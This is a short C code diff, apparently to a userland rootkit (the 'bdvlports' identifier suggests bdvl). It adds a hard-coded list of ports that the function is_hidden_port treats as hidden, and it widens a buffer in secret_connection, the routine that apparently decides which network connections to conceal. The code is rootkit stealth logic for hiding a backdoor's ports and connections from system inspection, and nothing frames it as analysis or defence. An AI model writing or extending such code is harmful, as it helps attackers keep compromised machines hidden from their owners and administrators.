@@ -1,4 +1,8 @@
 int is_hidden_port(int port){
+    for(int i = 0; i != BDVLPORTS_SIZE; i++)
+        if(port == bdvlports[i])
+            return 1;
+
     FILE *fp;
     char buf[13], // max len line can be is len("xxxxx-xxxxx")
          *buf_tok = NULL;
@@ -40,7 +44,7 @@ int is_hidden_port(int port){
 }
 
 int secret_connection(char line[]){
-    char raddr[128], laddr[128], etc[128];
+    char raddr[128], laddr[128], etc[512];
     unsigned long rxq, txq, t_len,
                   retr, inode;
     int lport, rport, d, state, uid, t_run, tout;
